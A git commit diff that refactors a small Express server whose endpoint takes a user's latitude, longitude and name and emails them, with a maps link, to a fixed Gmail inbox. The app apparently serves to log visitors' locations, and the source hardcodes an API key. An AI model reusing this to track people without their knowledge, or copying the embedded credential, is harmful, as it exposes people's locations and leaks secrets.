cd83138e0653b82942887f653dcbacb8d1dd3d57
AKram Khan <91476267+akram6t@users.noreply.github.com>
2025-01-04 15:04:13 +0530

    Update app.js

--- app.js
+++ app.js
@@ -1,7 +1,7 @@
 const express = require('express');
 const path = require('path');
 const app = express();
-const port = 5000;
+const port = process.env.PORT || 5000;
 const { Resend } = require('resend');
 
 app.use(express.json());
@@ -9,7 +9,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 app.get('/', (req, res) => {
-    res.sendFile(path.resolve('./public/index.html'));
+    return res.sendFile(path.resolve('./public/index.html'));
 });
 
 app.post('/api/notify', (req, res) => {
@@ -19,25 +19,32 @@ app.post('/api/notify', (req, res) => {
     if (error) {
         sendEmail({ title: 'Error in notification', body: 'Error in notification', user: queryName || "" });
         console.log('Error in notification');
-        res.send('Error in notification');
-        return;
+        return res.send('Error in notification');
     }
 
-    sendEmail({ title: 'Aa gaya bhai',
+    sendEmail({
+        title: 'Aa gaya bhai',
         body: `latitude is: ${latitude} <br> longitude is: ${longitude}
         <a href="https://www.google.com/maps?q=${latitude},${longitude}">open maps</a>`,
-        user: queryName || "" });
-    res.send('Notification received');
+        user: queryName || ""
+    });
+    return res.send('Notification received');
 });
 
-app.listen(() => {
-    console.log(`Server is running... updated`);
+const server = app.listen(port, () => {
+    console.log(`Server is running on port ${port}`);
+});
+
+process.on('SIGTERM', () => {
+    console.log('SIGTERM signal received: closing HTTP server');
+    server.close(() => {
+        console.log('HTTP server closed');
+    });
 });
 
 async function sendEmail({ title, body, user }) {
     const resend = new Resend('re_FVV2rZjE_JcWWZxg3FmB7ocvwBVw5iMUk');
     console.log('Sending email');
-    // Code to send email
     const { data, error } = await resend.emails.send({
         from: 'Chhotu kalu<onboarding@resend.dev>',
         to: ['comeingame72@gmail.com'],
@@ -46,11 +53,11 @@ async function sendEmail({ title, body, user }) {
           <h1>${title}</h1>
           <p>${body}</p>
           <p>User: ${user}</p>`
-      });
-    
-      if (error) {
+    });
+
+    if (error) {
         return console.error({ error });
-      }
-    
-      console.log({ data });
+    }
+
+    console.log({ data });
 }
